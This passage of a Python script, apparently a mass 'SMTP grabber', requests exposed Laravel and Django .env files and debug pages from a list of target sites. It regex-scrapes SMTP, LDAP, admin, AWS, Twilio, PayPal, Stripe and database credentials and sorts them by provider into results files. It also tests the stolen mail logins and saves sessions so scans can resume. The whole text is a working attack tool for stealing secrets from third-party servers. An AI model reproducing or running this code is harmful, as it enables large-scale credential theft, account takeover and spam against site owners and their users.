                    try:
                        mailfrom = reg("<td>DEFAULT_FROM_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>DEFAULT_FROM_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "DJANGO" in text:
                    method = '/.env'
                    mailhost = reg("\nDJANGO_EMAIL_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nDJANGO_EMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nDJANGO_EMAIL_HOST_USER=(.*?)\n", text)[0]
                    mailpass = reg("\nDJANGO_EMAIL_HOST_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("DEFAULT_FROM_EMAIL=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("DEFAULT_FROM_EMAIL=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>ADMIN_USERNAME</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>ADMIN_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>ADMIN_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>ADMIN_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>ADMIN_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>ADMIN_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>ADMIN_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "ADMIN_USERNAME=" in text:
                    method = '/.env'
                    mailhost = reg("\nADMIN_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nADMIN_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nADMIN_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nADMIN_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("ADMIN_EMAIL=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("ADMIN_EMAIL=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>ADMIN</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>ADMIN_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>ADMIN_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>ADMIN_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>ADMIN_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>ADMIN_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>ADMIN_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "ADMIN" in text:
                    method = '/.env'
                    mailhost = reg("\nADMIN_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nADMIN_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nADMIN_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nADMIN_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("ADMIN_EMAIL=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("ADMIN_EMAIL=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>ADMIN</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>FROM_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "ADMIN" in text:
                    method = '/.env'
                    mailhost = reg("\nHOST=(.*?)\n", text)[0]
                    mailport = reg("\nPORT=(.*?)\n", text)[0]
                    mailuser = reg("\nUSER=(.*?)\n", text)[0]
                    mailpass = reg("\nPASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("FROM_EMAIL=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("FROM_NAME=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>LDAP_SERVER</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>LDAP_SERVER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>LDAP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>LDAP_UID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>LDAP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>LDAP_UID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>LDAP_UID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "LDAP_SERVER=" in text:
                    method = '/.env'
                    mailhost = reg("\nLDAP_SERVER=(.*?)\n", text)[0]
                    mailport = reg("\nLDAP_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nLDAP_UID=(.*?)\n", text)[0]
                    mailpass = reg("\nLDAP_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("LDAP_UID=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("LDAP_UID=(.*?)\n", text)[0]
                    except:
                        fromname = ''

                if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
                    return False
                else:
                    # mod aws
                    if '.amazonaws.com' in mailhost:
                        getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/'+getcountry[:-2]+'.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                        remover = str(build).replace('\r', '')
                        save2 = open('Results/SMTP_AWS.txt', 'a')
                        save2.write(remover+'\n\n')
                        save2.close()
                    elif 'sendgrid' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_Sendgrid.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'office365' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_Office.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'outlook' in mailhost or 'live' in mailhost or 'hotmail' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_Office.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif '1and1' in mailhost or '1und1' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_IONOS.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'ionos' in mailhost or 'ionos' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_IONOS.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'zoho' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_Zoho.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'mandrillapp' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_Mandrill.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'mailgun' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_Mailgun.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'ovh' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_OVH.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'gmail' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_GOOGLE.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close
                    elif 'googlemail' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_GOOGLE.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'yandex' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_Yandex.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'secureserver' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_Godaddy.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'hostgator' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_Hostgator.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'sendinblue' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_Sendinblue.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'mailjet' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_Mailjet.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'btinternet' in mailhost or 'yahoo' in mailhost or 'rocketmail' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_YAHOO.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    else:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    return True
            else:
                return False
        except:
            return False

def printf(text):
    ''.join([str(item) for item in text])
    print((text + '\n'), end=' ')

def main(url):
    resp = False
    try:
        text = '\033[32;1m#\033[0m '+url
        headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
        if "APP_KEY=" in get_source:
            resp = get_source
        else:
            get_source = requests.post(url, data={"0x[]":"drosteam"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source:
                resp = get_source
        if resp:
            getsmtp = drosteam().get_smtp(resp, url)
            getwtilio = drosteam().get_twillio(resp, url)
            smsapi = drosteam().get_nexmo(resp, url)
            getaws = drosteam().get_aws_data(resp, url)
            getpp = drosteam().paypal(resp, url)
            getdb = drosteam().db_myer(resp, url)
            getstripe = drosteam().stripe(resp, url)
            if getsmtp:
                text += ' | \033[32;1mSMTP\033[0m'
            else:
                text += ' | \033[31;1mSMTP\033[0m'
            if getaws:
                text += ' | \033[32;1mAWS\033[0m'
            else:
                text += ' | \033[31;1mAWS\033[0m'
            if getwtilio:
                text += ' | \033[32;1mTWILIO\033[0m'
            else:
                text += ' | \033[31;1mTWILIO\033[0m'
            if smsapi:
                text += ' | \033[32;1mSMS API\033[0m'
            else:
                text += ' | \033[31;1mSMS API\033[0m'
            if getpp:
                text += ' | \033[32;1mPAYPAL\033[0m'
            else:
                text += ' | \033[31;1mPAYPAL\033[0m'
            if getdb:
                text += ' | \033[32;1mDATABASE\033[0m'
            else:
                text += ' | \033[31;1mDATABASE\033[0m'
            if getstripe:
                text += ' | \033[32;1mSTRIPE\033[0m'
            else:
                text += ' | \033[31;1mSTRIPE\033[0m'
        else:
            text += ' | \033[0;33mTeu bisa sadayana\033[0m'
            save = open('Results/Not_VULNerable.txt','a')
            asu = str(url).replace('\r', '')
            save.write(asu+'\n')
            save.close()
    except:
        text = '\033[31;1m#\033[0m '+url
        text += ' | \033[31;1mTeu bisa diakses\033[0m'
        save = open('Results/Not_VULNerable.txt','a')
        asu = str(url).replace('\r', '')
        save.write(asu+'\n')
        save.close()
    printf(text)


if __name__ == '__main__':
    print(''' 
       ___
     o|* *|o  ╔╦═╦╗╔╦╗╔╦═╦╗
     o|* *|o  ║║╔╣╚╝║║║║║║║
     o|* *|o  ║║╚╣╔╗║╚╝║╩║║
      \===/   ║╚═╩╝╚╩══╩╩╝║
       |||    ╚═══════════╝
       |||   S.M.T.P - G.R.A.B.E.R
       |||    ╔═╦═╦╦═╦╦═╗╔═╦╦══╦══╦╦╗
       |||    ║╩║║║║║║║╩║║╚║╠╗╔╩╗╔╩╗║
    ___|||___ ╚╩╩╩═╩╩═╩╩╝╚═╩╝╚╝ ╚╝ ╚╝
   
      By : AnnaQitty
      Github : github.com/annaqitty
                                   
    ''')
    try:
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')
        print("meunang cangcut! ambuan ulah")
        print(('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi))
        tanya = input("Tuluykeun Ulah ? [Y/n] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl # Send Error Biar Lanjut Ke Wxception :v
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = input("Ek diabuskeun ka Janda ? ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Euweuh Jandana euy!")
                exit()
            try:
                numthread = input("Sabaraha Ronde ? ")
            except:
                print("Ronde Na Sabaraha!")
                exit()
    pool = ThreadPool(int(numthread))
    for url in readsplit:
        if "://" in url:
            url = url
        else:
            url = "http://"+url
        if url.endswith('/'):
            url = url[:-1]
        jagases = url
        try:
            pool.add_task(main, url)
        except KeyboardInterrupt:
            session = open(pid_restore, 'w')
            cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(pid_restore)
    except:
        pass
